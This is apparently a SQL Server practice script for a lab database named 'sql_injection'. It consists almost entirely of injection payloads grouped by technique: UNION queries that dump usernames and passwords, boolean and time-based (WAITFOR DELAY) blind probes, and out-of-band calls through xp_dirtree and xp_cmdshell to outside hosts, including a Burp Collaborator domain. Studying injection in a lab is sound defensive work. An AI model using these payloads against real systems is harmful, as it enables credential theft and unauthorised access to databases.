USE sql_injection;

SELECT * FROM users;
SELECT COUNT(username) FROM users WHERE LEN(password) > 1;
--Error


--Union
SELECT * FROM users UNION SELECT NULL, username + '~' + password, NULL FROM users;
SELECT * FROM users UNION SELECT * FROM users;

SELECT * FROM users WHERE username = '' UNION SELECT username, password FROM users--' AND password = '123';
SELECT TOP 1 'x' FROM users;

--Boolean
SELECT * FROM users WHERE username = 'alice' AND SUBSTRING(password, 1, 1) = 'j';
--SELECT CASE WHEN SUBSTRING(password, 1, 1) = '9' THEN 1/0 ELSE NULL END;
SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'alice';
SELECT * FROM users WHERE username = 'alice' and (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'alice')='j'--' AND password = '123'
--Time
SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10'--' AND password = '1'
SELECT * FROM users WHERE username = ''; IF (1=1) WAITFOR DELAY '0:0:10'--' AND password = '1'

SELECT * FROM users WHERE username = ''; IF (SELECT COUNT(username) FROM users WHERE username = 'alice' AND LEN(password) > 5) = 1 WAITFOR DELAY '0:0:10'--

--Out of band
EXEC master..xp_dirtree '//sqlinjection.ddns.net\',1,0;
exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net',0,1;
EXEC master..xp_cmdshell 'nslookup localhost';
SELECT * FROM users WHERE username = ''; exec master..xp_dirtree 'C:\',1,0;--' AND password = '123';